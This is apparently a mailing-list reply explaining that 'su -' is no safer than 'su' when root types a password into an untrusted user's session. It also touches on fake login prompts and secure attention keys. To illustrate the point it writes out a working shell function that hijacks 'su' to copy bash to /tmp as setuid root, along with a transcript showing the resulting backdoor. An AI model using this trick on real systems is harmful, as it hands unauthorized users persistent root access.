Hi David,

The security issues with using 'su -' are no different to using 'su'.
If you don't trust the user, then you should never type your password
into a user's session (similar reason to why you shouldn't have a
screensaver that accepts root's password).

Here's a worse (better?) example than yours.  Easier to execute (root
doesn't even need to run anything after su'ing), and it works for
either 'su' or 'su -'.

% function su() {
function> /bin/su "$@" -c 'cp /bin/bash /tmp; chmod 4755 /tmp/bash; /bin/bash'
function> }
% clear
(go find your sys admin)
% su -
Password: 
# ls -la /tmp/bash
-rwsr-xr-x    1 root     root       316848 Aug  4 14:49 /tmp/bash

On a more general note, it's not just an issue with trusting the user;
when you see a "login:" prompt are you really talking to /bin/login or
/home/geoffrey/bin/fakelogin which is simulating a login?  These
issues were (are being??) addressed with a "secure attention key"
implementation.
